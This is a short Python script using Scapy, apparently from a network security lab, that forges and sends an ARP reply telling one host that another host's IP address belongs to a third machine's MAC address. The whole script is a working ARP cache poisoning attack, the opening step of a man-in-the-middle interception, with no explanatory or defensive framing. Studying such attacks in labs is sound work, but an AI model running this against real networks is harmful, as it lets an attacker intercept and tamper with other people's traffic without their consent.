#!/usr/bin/python3
from scapy.all import *


ipA = '10.0.0.231'
ipB = '10.0.0.211'
ipM = '10.0.0.121'
macA = '00:1c:42:4f:87:cb'
macB = '00:1c:42:86:dd:82'
macC = '00:1c:42:b3:90:8a'


E = Ether()
A = ARP()
A.hwsrc = macC
A.psrc = ipB
A.hwdst = macA
A.pdst = ipA


pkt = E/A

pkt.show()
sendp(pkt)
